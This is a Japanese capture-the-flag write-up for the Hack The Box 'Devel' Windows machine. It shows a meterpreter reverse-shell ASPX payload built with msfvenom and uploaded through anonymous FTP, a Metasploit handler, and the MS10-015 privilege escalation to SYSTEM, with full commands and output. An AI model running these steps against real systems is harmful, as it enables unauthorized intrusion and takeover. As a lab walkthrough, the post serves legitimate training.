---
layout:        post
title:         "HTB easy (Win): ftp > webshell > msf > recon"
date:          2021-05-26
category:      Security
cover:         /assets/cover1.jpg
redirect_from: /pentest/htb-easy-devel
comments:      true
published:     true
latex:         false
photoswipe:    false
syntaxhighlight: true
# sitemap: false
# feed:    false
---

FTPでリバースシェルをアップロードし、シェル接続後に Metasploitのlocal_exploit_suggester を使って権限昇格可能なものを効率よく探す。

- マシン名 : Devel (Windows)
- タグ : Windows, FTP, Arbitrary File Upload
- 使用ツール : nmap, ftp, msfvenom, msfconsole

### Enumeration

nmap

```bash
sudo nmap -A -T5 -oN nmaptcp 10.129.158.123
```

```console
Nmap scan report for 10.129.158.123
Host is up (0.26s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst:
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|8.1|7|Vista|2012 (92%)
...省略...
```

注目すべき点は、FTPでAnonymousログインが可能。
実際にFTPでファイルをアップロードしてみると、Web(IIS)の方にも反映されることから、FTPとHTTPは同じフォルダを参照していることが確認できる。


### Foothold

IISが動作しているので、aspxのリバースシェルを作成する

```bash
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.56 LPORT=4444 -f aspx > rev.aspx
```

FTPでアップロード

```console
$ ftp
ftp> open 10.129.158.123
Name (10.129.158.123:htb-tex2e): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> put rev.aspx
local: rev.aspx remote: rev.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2902 bytes sent in 0.00 secs (36.4153 MB/s)
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
05-26-21  03:47PM                 2902 rev.aspx
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
```

Metasploitでリバースシェルの待ち受け

```console
$ msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 10.10.14.56
set rhost 10.129.158.123
show options
run
```

Web経由でリバースシェル起動

```bash
$ curl http://10.129.158.123/rev.aspx
```

接続時のユーザ名確認

```console
[*] Sending stage (175174 bytes) to 10.129.158.123
[*] Meterpreter session 1 opened (10.10.14.56:4444 -> 10.129.158.123:49159) at 2021-05-26 12:52:00 +0000

meterpreter > getuid
Server username: IIS APPPOOL\Web
meterpreter >
```


### Privilege Escalation

Metasploitのlocal_exploit_suggesterモジュールで権限昇格可能なものを探す。

```console
background
use post/multi/recon/local_exploit_suggester
set session -1
options
run
```

```console
[*] 10.129.158.123 - Collecting local exploits for x86/windows...
[*] 10.129.158.123 - 37 exploit checks are being tried...
[+] 10.129.158.123 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.129.158.123 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.129.158.123 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.129.158.123 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.129.158.123 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.129.158.123 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.129.158.123 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.129.158.123 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.129.158.123 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.129.158.123 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.129.158.123 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.129.158.123 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.129.158.123 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```

MS10-015 で権限昇格を試してみる。

```console
use exploit/windows/local/ms10_015_kitrap0d
set session -1
set lhost 10.10.14.56
run
```

```console
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms10_015_kitrap0d
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms10_015_kitrap0d) > options

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, non
                                        e)
   LHOST     139.59.237.21    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)


msf6 exploit(windows/local/ms10_015_kitrap0d) > set session 1
session => 1
msf6 exploit(windows/local/ms10_015_kitrap0d) > set lhost 10.10.14.56
lhost => 10.10.14.56
msf6 exploit(windows/local/ms10_015_kitrap0d) > run

[*] Started reverse TCP handler on 10.10.14.56:4444
[*] Launching notepad to host the exploit...
[+] Process 3656 launched.
[*] Reflectively injecting the exploit DLL into 3656...
[*] Injecting exploit into 3656 ...
[*] Exploit injected. Injecting payload into 3656...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175174 bytes) to 10.129.158.123
[*] Meterpreter session 2 opened (10.10.14.56:4444 -> 10.129.158.123:49160) at 2021-05-26 13:00:14 +0000

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > cat "C:\Users\Administrator\Desktop\root.txt"
e62...b4b
```

ルート権限を奪取できたので終了
